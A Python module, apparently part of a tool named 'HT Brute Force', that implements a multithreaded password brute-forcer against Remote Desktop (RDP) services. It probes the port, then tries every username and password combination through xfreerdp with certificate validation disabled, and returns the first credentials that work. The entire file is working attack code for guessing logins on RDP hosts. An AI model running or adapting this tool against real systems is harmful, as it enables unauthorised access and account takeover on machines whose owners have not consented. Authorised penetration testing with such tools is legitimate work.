"""HT Brute Force — RDP brute force via rdp-check.
Uses a simple RDP connection attempt (protocol handshake).
Requires xfreerdp or rdp_check binary for full auth.
"""
import socket, subprocess, time, threading, queue

class RDPBruter:
    def __init__(self, timeout=10, max_threads=3, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _check_rdp(self, host, port):
        """Check if RDP is accepting connections."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            s.close()
            return True
        except Exception:
            return False

    def _try_xfreerdp(self, host, port, user, passwd):
        """Try xfreerdp if available."""
        try:
            r = subprocess.run(
                ["xfreerdp", f"/v:{host}:{port}", f"/u:{user}", f"/p:{passwd}",
                 "/cert:ignore", "/quiet"],
                capture_output=True, timeout=self.timeout + 5)
            return r.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def run(self, host, port, users, passwords):
        if not self._check_rdp(host, port):
            return [{"error": "no_rdp_service"}]
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                t0 = time.time()
                success = self._try_xfreerdp(host, port, u, p)
                if success:
                    self.results.append({"user": u, "password": p, "time_s": round(time.time()-t0, 2)})
                    self.stop_event.set()
                elif self._check_rdp(host, port) and not success:
                    pass  # wrong creds
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results